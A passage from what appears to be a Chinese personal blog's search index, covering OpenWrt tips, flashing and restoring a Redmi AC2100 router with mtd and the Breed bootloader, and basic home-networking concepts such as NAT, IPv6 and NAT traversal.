<p>\u5982\u679c\u5b89\u88c5\u662f\u5b89\u88c5\u4e86luci-app-xxx\uff0c\u60f3\u8981\u5728luci\u4e2d\u663e\u793a\u3002 - \u65b9\u6cd5\u4e00\uff1a\u767b\u51fa\u7136\u540e\u767b\u5f55 - \u65b9\u6cd5\u4e8c\uff1a<code>/etc/init.d/rpcd restart</code></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#git-remote-https-is-not-a-git-command","title":"git: 'remote-https' is not a git command.","text":"<pre><code>opkg install git-http\n</code></pre> <p>git-http - Git is a free &amp; open source, distributed version control system designed to handle everything from small to very large projects with speed and efficiency. This package allows git push/fetch over http(s) and ftp(s)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/","title":"\u8bb0\u5f55\u7ea2\u7c73AC2100\u6298\u817e","text":"<p>\u7b2c\u4e00\u6b21\u5c1d\u8bd5\u81ea\u5df1\u5237\u8def\u7531\u5668\uff0c\u7f51\u4e0a\u641c\u7d22\u4e86\u5f88\u591a\u8d44\u6599\uff0c\u5fd9\u6d3b\u4e862\u5929\uff0c\u671f\u95f4\u5dee\u70b9\u4ee5\u4e3a\u5c06\u8def\u7531\u5668\u5237\u6210\u7816\u4e86\u3002</p> <p>\u7ea2\u7c73AC2100\u8fd9\u6b3e\u8def\u7531\u5668\u786e\u5b9e\u7b97\u662f\u5f88\u706b\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u8d44\u6599\u3002\u521a\u5f00\u59cb\u5728\u6069\u5c71\u8bba\u575b\u67e5\u627e\u5404\u79cd\u8d44\u6599\uff0c\u4f46\u662f\u89c9\u5f97\u6069\u5c71\u8bba\u575b\u7684\u5e16\u5b50\u6709\u70b9\u4e71\uff0c\u5bf9\u65b0\u624b\u4e0d\u592a\u53cb\u597d\u3002\u770b\u7cbe\u534e\u5e16\u65f6\u5e16\u5b50\u4e4b\u95f4\u7684\u8054\u7cfb\u6027\u4e0d\u5927\uff0c\u8981\u662f\u6709\u4e00\u4e2a\u677f\u5757\u8fdb\u884c\u603b\u7ed3\u6027\u7684\u4ecb\u7ecd\u5c31\u597d\u4e86\u3002</p> <p>\u6bd4\u5982\u4e0a\u6765\u5c31\u770b\u5230\u8bba\u575b\u8bf4\u4ec0\u4e48\u95ea\u5b58\u574f\u5757\u7684\uff0c\u5bfc\u81f4\u6211\u521a\u5f00\u59cb\u8fd8\u8981\u53bb\u7814\u7a76\u5982\u4f55\u67e5\u770b\u8def\u7531\u5668\u662f\u5426\u6709\u574f\u5757\u3002\u7136\u540e\u5c31\u662f\u770b\u5230\u7684\u90fd\u662f\u4ec0\u4e48telnet\u7684\u65b9\u6848\uff0c\u4f46\u662f\u660e\u660e\u6709\u901a\u8fc7\u7f51\u9875\u5f00\u542fssh\u7684\u975e\u5e38\u7b80\u5355\u7684\u65b9\u6848\u554a\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u5728\u8fc7\u65f6\u7684\u5e16\u5b50\u91cc\u63d0\u4e00\u4e0b\u5462\uff01\u8fd9\u70b9\u5bfc\u81f4\u6211\u5404\u79cd\u8d70\u5f2f\u8def\uff01\uff08\u8fd9\u70b9\u4e5f\u4f53\u73b0\u4e86\u603b\u7ed3\u6027\u5e16\u5b50\u7684\u91cd\u8981\uff09</p> <p>\u7136\u540e\u5c31\u662f\u4e3a\u4ec0\u4e48\u6069\u5c71\u91cc\u53ea\u63d0\u4f9b\u5404\u79cdopenwrt\u7684\u6539\u7248\uff1f\u5c31\u6ca1\u6709\u4eba\u7ad9\u51fa\u6765\u8bf4\u4e00\u4e0b\u5b98\u65b9\u7248\u7684\u4f18\u7f3a\u70b9\u5417\uff1f\u8fd9\u4e00\u5ea6\u8ba9\u6211\u4ee5\u4e3aopenwrt\u7684\u5b98\u65b9\u7248\u4e0d\u597d\u4e0d\u80fd\u7528\u5462\u3002\u4f46\u540e\u9762\u6211\u770bopenwrt\u5b98\u7f51\u7684\u65f6\u5019\uff0c\u4e5f\u6ca1\u6709\u53d1\u73b0\u4ec0\u4e48\u7f3a\u70b9\u554a\uff0c\u800c\u4e14openwrt\u5b98\u7f51\u6587\u6863\u975e\u5e38\u4e30\u5bcc\uff01\u662f\u5165\u95e8\u6298\u817e\u8def\u7531\u5668\u7684\u7edd\u4f73\u6750\u6599\u3002</p> <p>\u597d\u4e86\uff0c\u5410\u69fd\u5b8c\u6bd5\uff0c\u4ee5\u4e0b\u662f\u6211\u8fd9\u6bb5\u65f6\u95f4\u6298\u817e\u7684\u603b\u7ed3\u3002</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u540d\u8bcd\u4ecb\u7ecd","title":"\u540d\u8bcd\u4ecb\u7ecd","text":"<ol> <li>breed\uff1a\u4e00\u4e2a\u591a\u529f\u80fd\u7684\u5f15\u5bfc\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5237\u7cfb\u7edf\u56fa\u4ef6\uff0c\u9002\u914d\u4e86\u5f88\u591a\u786c\u4ef6\uff0c\u63d0\u4f9b\u4e86\u65b9\u4fbf\u7684web\u754c\u9762\u548c\u547d\u4ee4\u884c\u754c\u9762\u3002</li> </ol> <p>\u539f\u5e16\uff1a\u30102020-10-09\u3011AR/QCA/MTK Breed\uff0c\u529f\u80fd\u5f3a\u5927\u7684\u591a\u7ebf\u7a0b Bootloader - OPENWRT\u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>\u4e0b\u8f7d\uff1aIndex of / (hackpascal.net)</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u76f4\u63a5\u4e0a\u56fe","title":"\u76f4\u63a5\u4e0a\u56fe","text":"<p>\u8fd9\u5f20\u56fe\u663e\u793a\u4e86\u5404\u79cd\u5237\u673a\u7684\u65b9\u5f0f\uff0c\u5177\u4f53\u8fc7\u7a0b\u5728\u4e4b\u540e\u4ecb\u7ecd\u3002</p> <p></p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u83b7\u53d6shell","title":"\u83b7\u53d6shell","text":"<p>\u65b9\u6848\u6765\u6e90\u8005\u6211\u6ca1\u6709\u627e\u5230\uff0c\u8c8c\u4f3c\u90fd\u662f\u6700\u5148\u5728\u6069\u5c71\u8bba\u575b\u4e0a\u63d0\u51fa\u7684\u3002</p> <ol> <li>telnet\u65b9\u6848</li> </ol> <p>\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4e0d\u63d0\u3002</p> <ol> <li> <p>ssh\u65b9\u6848</p> </li> <li> <p>\u539f\u521b\uff1a[0825:AC2100\u65b0\u56fa\u4ef6\u6709\u6548AX6\u65e0\u6548]AX3600/AX1800/AX5/AC2100\u5b98\u65b9\u56fa\u4ef6\u5f00\u542fSSH\u65b9\u6cd5[\u539f\u521b] - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> </li> <li> <p>openwrt wiki\u6559\u7a0b\u4e2d\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2aJavaScript\u811a\u672c\u53ef\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u8fd0\u884c\uff0c\u4e0d\u5fc5\u624b\u52a8\u590d\u5236Stock\u4ee3\u7801\u3002[OpenWrt Wiki] Xiaomi Redmi Router AC2100</p> </li> </ol> <p>\u6709\u7684\u5e16\u5b50\u8bf4\u6709\u6f0f\u6d1e\u7684\u5b98\u65b9\u56fa\u4ef6\u7248\u672c\u662f2.0.7\u7248\u672c\uff0c\u4f46\u6211\u5b9e\u6d4b2.0.23\u7248\u672c(2021-06-22\u65f6\u7684\u6700\u65b0\u7248)\u662f\u53ef\u4ee5\u7528\u7684\uff0copenwrt wiki\u4e0a\u4e5f\u8981\u6c422.0.23\u7248\u672c\u3002</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u4ece\u5b98\u65b9\u5237openwrt","title":"\u4ece\u5b98\u65b9\u5237openwrt","text":"<pre><code>mtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1\nmtd -r write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0 #-r\u53c2\u6570\u8868\u793a\u5b8c\u6210\u540e\u91cd\u542f\n</code></pre> <p>kernel\u6309\u7167\u539f\u5382bootloader\u6240\u8981\u6c42\u7684\u65b9\u5f0f\u6dfb\u52a0\u5230\u955c\u50cf\u4e2d\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fdd\u7559\u539f\u5382\u7684bootloader\uff08\u89c1[OpenWrt Wiki] Overview\uff09</p> <p>\uff08\u8bf4\u660e\u8def\u7531\u5668\u8fd9\u79cd\u8bbe\u5907\uff0c\u5f15\u5bfc\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u662f\u7ed1\u5b9a\u5728\u4e00\u8d77\u7684\uff09</p> <p>Also the kernel is handled like a package, but is added to the firmware image in the special way each device's bootloader expects it, so you can replace the stock firmware without touching the bootloader itself (that is dangerous and not always possible).</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u5237breed","title":"\u5237breed","text":"<p>\u7ea2\u7c73/\u5c0f\u7c73AC2100\u5237\u5165r3g breed\u4ee5\u53ca\u6062\u590d\u5b98\u65b9boot\u8be6\u7ec6\u6559\u7a0b\uff08\u66f4\u65b0\u67e5\u574f\u5757\u65b9\u6cd5\u3001pb-boot\uff09 - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <ol> <li>\u8fdb\u5165shell\u540e\uff0c<code>cat /proc/mtd</code>\u67e5\u770bflash\u5206\u533a</li> <li>\u4e0a\u4f20breed\u5e76\u8fd0\u884c<code>mtd -r write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader</code></li> </ol>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u4ecebreed\u5237openwrt","title":"\u4ecebreed\u5237openwrt","text":"<p>[2020-08-29\u66f4\u65b0] \u6559\u7a0b\uff1a\u5c0f\u7c73\u548c\u7ea2\u7c73AC2100\u7528breed\u5237openwrt - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <ol> <li>\u8fdbbreed\u7684\u73af\u5883\u53d8\u91cf\u7f16\u7f09\u83dc\u5355\uff0c\u65b0\u589e\u5b57\u6bb5xiaomi.r3g.bootfw\u503c\u4e3a2</li> <li>\u4e0b\u8f7d\u4e34\u65f6\u56fa\u4ef6\u5237\u5165\u8def\u7531\u5668\u5e76\u91cd\u542f</li> <li>\u8fdb\u5165openwrt\u66f4\u65b0\u7cfb\u7edf\u56fa\u4ef6\uff0c\u4e0d\u8981\u52fe\u9009 \u4fdd\u7559\u914d\u7f6e\u9009\u9879</li> </ol>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u6062\u590d\u5230\u5b98\u65b9","title":"\u6062\u590d\u5230\u5b98\u65b9","text":"<ol> <li> <p>\u6062\u590d\u5b98\u65b9Bootloader</p> </li> <li> <p>\u901a\u8fc7breed\u66f4\u65b0Bootloader</p> </li> <li> <p>\u8fdb\u5165shell\u6267\u884cmtd write\u547d\u4ee4</p> </li> <li> <p>\u4f7f\u7528\u5b98\u65b9\u4fee\u590d\u5de5\u5177</p> </li> </ol> <p>\u3010\u5c0f\u7c73\u8def\u7531\u5668\u4fee\u590d\u5de5\u5177\u3011\u4f7f\u7528\u8bf4\u660e\u548c\u5237\u673a\u6559\u7a0b - \u5c0f\u7c73\u793e\u533a (xiaomi.cn)</p> <p>\u8bb0\u5f55\uff1a</p> <p>\u9996\u5148\u4f7f\u7528breed\u76f4\u63a5\u5237\u4e86\u5c0f\u7c73\u5b98\u65b9bootloader\uff08\u6709\u4e9b\u5730\u65b9\u8bf4\u4e0d\u884c\uff0c\u6700\u597d\u624b\u52a8\u4f7f\u7528mtd write\u547d\u4ee4\uff09\uff0c\u7136\u540e\u4f7f\u7528\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u6062\u590d\u5b98\u65b9\u56fa\u4ef6</p> <p>\u5751\uff1a</p> <ul> <li>\u8fd0\u884c\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u9700\u8981\u5173\u95edwindows\u5373\u65f6\u6740\u6bd2</li> <li>\u6700\u597d\u7981\u7528\u4e00\u4e9b\u7f51\u5361\u514d\u5f97\u9009\u62e9\u9519\u8bef</li> <li>\u5931\u8d25\u4e86\u4e09\u56db\u6b21\uff0c\u6362\u7528\u4e0d\u540c\u5730\u65b9\u4e0b\u8f7d\u7684\u5b98\u65b9\u56fa\u4ef6\u6700\u540e\u89e3\u51b3\u4e86\uff08\u6700\u540e\u7528\u7684\u672c\u76ee\u5f55\u76842.0.23.bin\uff09</li> <li>\u5b9e\u6d4b\u5199\u5b98\u65b9\u56fa\u4ef6\u4e0d\u52301\u5206\u949f\uff0c\u4e0d\u5fc5\u7b49\u592a\u957f</li> </ul>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u5176\u5b83\u65b9\u5f0f","title":"\u5176\u5b83\u65b9\u5f0f","text":"<p>\u9002\u7528\u4e8ebreed\u7684\u4fee\u6539\u7248\u5b98\u65b9\u56fa\u4ef6</p> <p>[2020\u5e7411\u670828\u65e5\u66f4\u65b0]breed\u5237\u673a\u7ea2\u7c73AC2100\u5c0f\u7c73AC2100\u539f\u5382\u56fa\u4ef6\u5b98\u65b9\u56fa\u4ef6 - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u5176\u5b83\u53c2\u8003","title":"\u5176\u5b83\u53c2\u8003","text":"<p>\u6069\u5c71\u7684\u8fd9\u4e2a\u5e16\u5b50\u9002\u5408\u5c0f\u767d\uff1a\u7ea2\u7c73(\u5c0f\u7c73)AC2100\u65e0\u9700Telnet\u5237\u5165Breed\u548cPadavan\u56fa\u4ef6\u6559\u7a0b - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531-","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531:-)","text":"<p>\u8fd9\u91cc\u8bf4\u7684\u7f51\u7edc\u81ea\u7531\uff0c\u662f\u6307\u901a\u8fc7\u7f51\u7edc\u5de5\u5177\u6781\u5927\u5730\u4fbf\u5229\u751f\u6d3b\u7684\u67d0\u4e9b\u65b9\u9762\u3002\u8fd9\u7bc7\u6587\u7ae0\u662f\u6211\u81ea\u5df1\u5bf9\u6298\u817e\u8def\u7531\u5668\u5237\u673a\u3001openwrt\u3001ipv6\u7684\u603b\u7ed3\uff0c\u5e76\u5c3d\u91cf\u8bf4\u660e\u4e86\u5404\u79cd\u73a9\u6cd5\u7684\u5b9e\u9645\u7528\u9014\u3002\u5176\u4e2d\u6709\u4e9b\u64cd\u4f5c\u786e\u5b9e\u7ed9\u6211\u5e26\u6765\u4e86\u6781\u5927\u4fbf\u5229\uff0c\u6bd4\u5982\u5176\u4e2d\u4f7f\u7528iSCSI\u901a\u8fc7\u7f51\u7edc\u6302\u8f7d\u5176\u5b83\u8bbe\u5907\u7684\u786c\u76d8\uff0c\u8fd9\u5145\u5206\u89e3\u653e\u4e86\u6211\u53ea\u6709500GB\u7684\u8f7b\u8584\u672c\u3002\u5728\u4e0a\u9762\u5b89\u88c5\u6e38\u620f\u540e\uff0c\u53c8\u53ef\u4ee5\u5b9e\u73b0\u5728\u4e0d\u540c\u8bbe\u5907\u4e0a\u65e0\u7f1d\u73a9\u540c\u4e00\u4e2a\u6e38\u620f\u7684\u4f53\u9a8c\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"<ul> <li>\u5149\u7ea4\u5bbd\u5e26\u4e0a\u7f51</li> </ul> <p>\u5bf9\u4e8e\u5149\u7ea4\u63a5\u5165\u7684\u5bbd\u5e26\uff0c\u4f1a\u6709\u4e00\u4e2a\u8bbe\u5907\u53eb\u505a\u5149\u732b\uff08\u732b\uff0cmodem\uff0c\u8c03\u5236\u89e3\u8c03\u5668\uff09\uff0c\u7528\u4e8e\u5c06\u5149\u4fe1\u53f7\u8f6c\u6362\u4e3a\u7535\u4fe1\u53f7\u3002\u5149\u732b\u540e\u9762\u9664\u4e86\u5149\u7ea4\u63a5\u5165\uff0c\u8fd8\u6709\u4e00\u6392LAN\u53e3\u4f5c\u4e3a\u8f93\u51fa\u3002\u6211\u4eec\u4f1a\u5c06\u5176\u4e2d\u4e00\u4e2aLAN\u53e3\u8fde\u63a5\u5230\u81ea\u5df1\u4e70\u7684\u8def\u7531\u5668\u80cc\u540e\u7684WAN\u53e3\u4e0a\uff08\u53ea\u6709\u4e00\u4e2a\uff0c\u5e76\u4e14\u4e00\u822c\u989c\u8272\u4e0d\u4e00\u6837\uff09</p> <p>\u6b64\u65f6\u6709\u4e24\u79cd\u914d\u7f6e\u65b9\u6cd5\u53ef\u4ee5\u4e0a\u7f51\uff1a</p> <ul> <li> <p>\u5149\u732b\u4e2d\u8bbe\u7f6e\u62e8\u53f7\u4e0a\u7f51\uff0c\u8def\u7531\u5668WAN\u8bbe\u7f6e\u4e3aDHCP\u534f\u8bae</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u88c5\u5bbd\u5e26\u7684\u5e08\u5085\u4f1a\u8bbe\u7f6e\u6210\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5149\u732b\u4e5f\u76f8\u4f5c\u4e3a\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u81ea\u5df1\u4e70\u7684\u8def\u7531\u5668\u5219\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e8c\u7ea7\u8def\u7531\u5668</p> <p>ps. \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5149\u732b\u548c\u8def\u7531\u5668\u5904\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684\u7f51\u6bb5(\u5c40\u57df\u7f51)\uff0c\u4e2d\u95f4\u7ecf\u8fc7\u4e00\u5c42NAT\uff0c\u6bd4\u5982\u5149\u732b\u4e3a192.168.0.1\uff0c\u8def\u7531\u5668\u4e3a192.168.1.1</p> <p>ps. \u5149\u732b\u4e2d\u4e00\u822c\u4e5f\u53ef\u4ee5\u5f00\u542f\u4e00\u4e2a\u65e0\u7ebf\u7f51\u7edc\uff0c\u540d\u5b57\u662f\u56fa\u5b9a\u7684\u3002\u56e0\u6b64\u751a\u81f3\u53ef\u4ee5\u4e0d\u7528\u8def\u7531\u5668\u800c\u53ea\u4f7f\u7528\u5149\u732b</p> <p>ps. \u5b58\u5728\u6027\u80fd\u95ee\u9898\uff1a\u4e00\u822c\u6765\u8bf4\uff0c\u5149\u732b\u7684\u786c\u4ef6\u914d\u7f6e\u76f8\u5bf9\u4e8e\u81ea\u5df1\u4e70\u7684\u8def\u7531\u5668\u90fd\u6bd4\u8f83\u4f4e\uff0c\u4f5c\u4e3a\u8def\u7531\u5668\u7684\u8bdd\u53ef\u80fd\u9020\u6210\u6027\u80fd\u74f6\u9888\uff0c\u56e0\u6b64\u66f4\u63a8\u8350\u4e0b\u9762\u7684\u914d\u7f6e\u65b9\u5f0f</p> </li> <li> <p>\u5149\u732b\u8bbe\u7f6e\u4e3a\u6865\u63a5\u6a21\u5f0f\uff0c\u8def\u7531\u5668WAN\u8bbe\u7f6e\u4e3a\u62e8\u53f7\u4e0a\u7f51</p> <p>\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5149\u732b\u53ea\u4f5c\u4e3a\u4e00\u4e2a\u5149\u7535\u8f6c\u6362\u8bbe\u5907\uff0c\u8def\u7531\u5668\u8d1f\u8d23\u8def\u7531\u3001\u8f6c\u53d1\u3002\u56e0\u6b64\u5149\u732b\u4e0d\u4f1a\u9020\u6210\u6027\u80fd\u74f6\u9888\u3002</p> </li> <li> <p>\u516c\u7f51ip</p> </li> <li> <p>\u8ba1\u7b97\u673a\u4e4b\u95f4\u8981\u60f3\u76f8\u4e92\u901a\u4fe1\uff0c\u9700\u8981\u4f7f\u7528ip\u5730\u5740\u6765\u8fdb\u884c\u6807\u8bc6\u3002\u5982\u679c\u6bcf\u53f0\u8ba1\u7b97\u673a\u7684ip\u90fd\u4e0d\u540c\uff0c\u90a3\u4e48\u60c5\u51b5\u6700\u7b80\u5355\u3002\u8fd9\u79cdip\u79f0\u4e3a\u516c\u7f51ip</p> </li> <li> <p>\u4f46\u662f\u7531\u4e8eipv4\u6570\u91cf\u6709\u9650\uff0c\u65e0\u6cd5\u7ed9\u6bcf\u53f0\u8ba1\u7b97\u673a\u90fd\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684ip\uff0c\u56e0\u6b64\u4ea7\u751f\u4e86NAT\u6280\u672f\u3002\u5927\u81f4\u8fc7\u7a0b\uff1a\u8fde\u63a5\u5230\u540c\u4e00\u4e2a\u8def\u7531\u5668\u4e0a\u7684\u8bbe\u5907\uff08\u5373\u4e00\u4e2a\u5c40\u57df\u7f51\uff09\u88ab\u5206\u914d\u7ed9\u4e00\u4e2a\u5185\u7f51\u5730\u5740\u3002\u5f53\u5176\u4e2d\u67d0\u4e2a\u8bbe\u5907\u4e0a\u7f51\u65f6\uff08\u5982\u8bbf\u95eeB\u7ad9\uff09\uff0c\u8def\u7531\u5668\u8f6c\u53d1\u8be5\u8bbe\u5907\u7684\u7f51\u7edc\u5305\uff0c\u5e76\u5c06\u5176\u4e2d\u7684ip\u8f6c\u6362\u6210\u81ea\u5df1\u7684\u516c\u7f51ip\u3002\u4e4b\u540e\u5f53\u8def\u7531\u5668\u63a5\u6536\u5230B\u7ad9\u670d\u52a1\u5668\u7684\u54cd\u5e94\u65f6\uff0c\u540c\u6837\u5c06\u7f51\u7edc\u5305\u4e2dip\u8f6c\u6362\u56de\u8bbe\u5907\u7684\u5185\u7f51ip\u3002</p> <p>\u56e0\u6b64\uff0c\u6574\u4e2a\u8fc7\u7a0b\u4e2d\uff0cB\u7ad9\u7684\u670d\u52a1\u5668\u8ba4\u4e3a\u5728\u548c\u8def\u7531\u5668\u8fdb\u884c\u901a\u4fe1\u3002</p> </li> <li> <p>NAT\u4f7f\u5f97\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\u7684\u8bbe\u5907\u5171\u7528\u4e00\u4e2a\u516c\u7f51ip\u4e0a\u7f51\uff0c\u751a\u81f3\u8fd8\u53ef\u4ee5\u591a\u5c42NAT\u5957\u5a03\uff0c\u5927\u5927\u8282\u7ea6\u4e86ip\u5730\u5740\u3002\u4f46\u662f\u540c\u65f6\u4e5f\u4f7f\u5f97\u5c40\u57df\u7f51\u5916\u7684\u8bbe\u5907\u65e0\u6cd5\u8bbf\u95ee\u5c40\u57df\u7f51\u5185\u7684\u8bbe\u5907\uff0c\u5e26\u6765\u4e86\u9700\u8981\u5185\u7f51\u7a7f\u900f\u7684\u95ee\u9898\u3002</p> </li> <li> <p>\u76ee\u524d\u5bb6\u7528\u5bbd\u5e26\uff0c\u5206\u914d\u7684ip\u57fa\u672c\u662f\u5185\u7f51ip\uff0c\u4e0a\u7f51\u65f6\u9700\u8981\u7ecf\u8fc7\u8fd0\u8425\u5546\u8def\u7531\u5668\u7684NAT\u8f6c\u6362\u3002</p> </li> <li> <p>\u4f46\u662f\uff01\u968f\u7740ipv6\u7684\u666e\u53ca\uff0c\u76ee\u524d\u5bb6\u7528\u5bbd\u5e26\u5747\u53ef\u4ee5\u83b7\u5f97\u516c\u7f51\u7684ipv6\u5730\u5740\uff01\u6709\u4e86ipv6\u540e\uff0c\u6bcf\u4e2a\u8bbe\u5907\u90fd\u53ef\u4ee5\u83b7\u5f97\u552f\u4e00\u7684ipv6\u5730\u5740\uff0c\u4e07\u7269\u5747\u53ef\u4e92\u8054\uff0c\u7ec8\u4e8e\u56de\u5f52\u5230\u4e86\u4e92\u8054\u7f51\u672c\u6765\u7684\u6837\u5b50\uff01</p> </li> <li> <p>\u5185\u7f51\u7a7f\u900f</p> </li> </ul> <p>\u4f7f\u5f97\u5c40\u57df\u7f51\u5916\u7684\u8bbe\u5907\u8bbf\u95ee\u5c40\u57df\u7f51\u5185\u7684\u8bbe\u5907\u4fbf\u53eb\u505a\u5185\u7f51\u7a7f\u900f\u3002\u5185\u7f51\u7a7f\u900f\u5f88\u590d\u6742\uff0c\u51b5\u4e14\u6709\u4e86ipv6\u540e\u4fbf\u53ef\u4ee5\u628a\u8fd9\u4e9b\u90fd\u4e22\u6389\u4e86\uff0c\u56e0\u6b64\u8fd9\u91cc\u4ec5\u7b80\u5355\u8bf4\u660e\u4e00\u4e0b\u5e38\u89c1\u7684\u5185\u7f51\u7a7f\u900f\u65b9\u5f0f\uff1a</p> <ul> <li> <p>\u6700\u7b80\u5355\u7684\u60c5\u51b5\uff0c\u4f7f\u7528\u4e00\u4e2a\u516c\u7f51\u670d\u52a1\u5668\u4f5c\u4e3a\u8df3\u677f\u3002\u8bbe\u5907A\u8981\u60f3\u8bbf\u95ee\u5185\u7f51\u4e2d\u7684\u8bbe\u5907B\uff0c\u5148\u8bbf\u95ee\u670d\u52a1\u5668C\uff0cC\u518d\u5c06\u6570\u636e\u8f6c\u53d1\u7ed9B\u3002</p> <p>\u7f3a\u70b9\uff1a\u8fd9\u79cd\u65b9\u5f0fA\u8bbf\u95eeB\u7684\u5e26\u5bbd\u53d7\u9650\u4e8e\u8d2d\u4e70\u7684\u670d\u52a1\u5668C\u7684\u4e0a\u4f20\u4e0b\u8f7d\u5e26\u5bbd\u3002\u4e00\u822c\u7684\u670d\u52a1\u5668\u53ef\u80fd\u53ea\u67091~2M\u7684\u5e26\u5bbd\uff0c\u5f88\u5c0f\u3002</p> <p>ps. \u4f7f\u7528\u8fc7\u7684\u5de5\u5177\u6709Frp</p> </li> <li> 